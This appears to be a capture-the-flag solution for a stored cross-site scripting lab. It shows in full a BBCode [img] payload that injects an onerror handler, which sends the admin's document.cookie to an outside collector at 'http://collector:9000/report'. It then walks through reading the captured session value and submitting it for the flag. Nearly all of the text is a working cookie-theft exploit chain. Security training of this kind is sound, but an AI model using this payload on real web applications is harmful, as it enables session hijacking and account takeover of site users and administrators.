Full chain:

```
POST /topics
Content-Type: application/json

{"title":"pic","body":"[img]x\" onerror=\"new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)\"[/img]"}
```

The `[img]` URL is inserted raw, so the renderer emits:

```html
<img
  src="x"
  onerror="new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)"
/>
```

`src="x"` fails to load → `onerror` runs in the admin's browser when the bot
renders `GET /admin/topics` (~2s), beaconing the non-HttpOnly cookie to the
collector.

Read what the collector captured through the app's proxy:

```
GET /oob/received
```

You will see an item with a path like `/report?c=session%3D<32 hex>`
(URL-decode it). That hex value is the admin session. Submit it:

```
POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

and you get `FLAG{...}`. (`/solve` accepts either the bare 32-hex value or the
full `session=<value>` string.)
